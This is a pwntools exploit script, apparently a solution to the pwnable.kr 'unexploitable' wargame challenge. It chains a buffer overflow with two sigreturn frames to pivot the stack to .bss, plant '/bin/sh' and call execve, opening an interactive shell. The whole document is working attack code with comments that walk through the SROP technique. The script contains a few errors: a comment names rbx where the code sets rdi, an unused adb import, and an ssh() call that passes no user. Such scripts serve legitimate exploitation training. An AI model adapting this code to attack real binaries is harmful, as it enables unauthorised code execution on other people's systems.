from pwn import *
import time
import sys

from pwnlib.adb import kernel

context.arch = 'amd64'
context.os = 'linux'
def main():

    if(len(sys.argv) <2):
        print("Need to specify target.")
    else:
        if(sys.argv[1] == "remote"):
            p = ssh("pwnable.kr",)
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug("./unexploitable", gdbscript="b *main")
        else:
            p = process("./unexploitable")

        padding = 24 * b"A"
        main_addr = 0x400544
        syscall_addr = 0x400560
        elf = ELF("unexploitable")
        bss_start = elf.bss() +8 # stack alignment
        bin_sh = bss_start + 0x10 # we will store /bin/sh here.

        GetMeSigINT = b"A"*15

        sigFrame2= SigreturnFrame()
        sigFrame1= SigreturnFrame()

        sigFrame2.rax = 0x3b
        sigFrame2.rdi = bin_sh # point rbx to /bin/sh
        sigFrame2.rsi = 0
        sigFrame2.rdx = 0
        sigFrame2.rip = syscall_addr



        payload2 = b"/bin/sh\x00" + p64(main_addr) + p64(syscall_addr) + bytes(sigFrame2)

        # Our write primitive writes to RBP (RSP + 0x10) so by pivoting RSP to this addr, we can write to the data section.
        sigFrame1.rsp=bin_sh+ len("/bin/sh\x00") 
        sigFrame1.rax = 0;
        sigFrame1.rdi = 0;
        sigFrame1.rsi = bin_sh
        sigFrame1.rdx = len(payload2)
        sigFrame1.rip = syscall_addr

        payload1 = padding + p64(main_addr) + p64(syscall_addr) + bytes(sigFrame1) 

    # full exploit:
        # Phase 1:
            # - use the first read() to set the stack for a sigreturn
            # - as part of this, after main() is called again, we enter an input of length 0xf 
            # - We pivot the stack to bss with the sigFrame1
            # - we make a read() syscall on the pivoted stack
        # Phase 2: 
            # - we write payload 2 to bss, which will implant a /bin/sh at a known location, and redirect program flow to one last read()
            # - We use this read to send another 0xf chars, setting another sigreturn frame
            # - syscall triggers the sigreturn, and the sigreturn modifies the registers for an execve syscall, setting RIP to a syscall again.

        print("BSS at: ", bss_start)
        # Phase 1 
        time.sleep(4) # one extra second to be safe!
        p.send(payload1)
        time.sleep(4) # back to main()
        p.send(GetMeSigINT) # Control registers and call read() syscall
        print("SigInt called. Calling read() syscall")
        time.sleep(0.4)
        # Phase 2
        p.send(payload2) # input for read syscall
        print("Sent payload 2.")
        time.sleep(4) # main() is popped to RIP
        p.send(b"/bin/sh\x00AAAAAAA") # Control registers and call execve() syscall
        print("SigInt called. Calling execve")
        p.interactive()


main()
